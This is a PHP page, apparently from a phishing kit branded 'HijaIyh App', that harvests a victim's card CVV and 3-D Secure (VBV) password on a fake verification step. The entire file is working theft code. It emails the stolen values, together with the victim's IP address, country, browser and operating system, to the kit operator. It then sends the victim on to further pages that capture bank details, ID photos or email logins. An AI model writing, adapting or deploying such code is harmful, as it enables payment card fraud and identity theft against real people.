<?php 


echo '<center><br><br><br><br><img src="./HijaIyh_App/assets/img/spinner2.gif" style="margin-top:20%"></center>';


if(isset($_POST))
{
    $check = ['cvv','password_vbv'];
if($core->empty_post_array($check))
{
    $core->redirect('?page=verified&appIdKey='.$appidkey.'&locale='.@$localex);
    exit;
}
	$cvv = $core->post('cvv');
	$passwd = $core->post('password_vbv');

	$data = ['cvv' => $cvv , 'password' => $passwd ,   'useragent' => $_SERVER['HTTP_USER_AGENT'] ,
            'ip' => $core->userIP() , 
            'country' => $country_name , 
            'date' => date('D,d m Y H:i')];
    $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();

	$sendMsg = $core->parse_result('3dsecure',$data);
	$sendSubj = "3DSECURE : ".$core->session('bank')." ".$core->session('brandtype')." ".$core->session('levelcountry')." // $info";
	$sendFrom = "#HijaIyh:App";
  
    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
	$core->stats('3dsecure',$sendSubj);
    $core->create_session($data);

	 if($core->parse_hijaiyh('sp','bank') == 1)
        {
            $kemana = $core->mobile_link('bank');
        }else{
            if($core->parse_hijaiyh('sp','photo') == 1)
            {
                $kemana = $core->mobile_link('photo').'&type=id';
            }else{
                if($core->parse_hijaiyh('sp','email_login') == 1)
                {
                    $kemana = $core->mobile_link('email');
                }else{
                    $kemana = $core->mobile_link('finish');
                }
            }
        }
	$core->redirect('?page='.$kemana.'&appIdKey='.$appidkey.'&locale='.$localex);


}

 ?>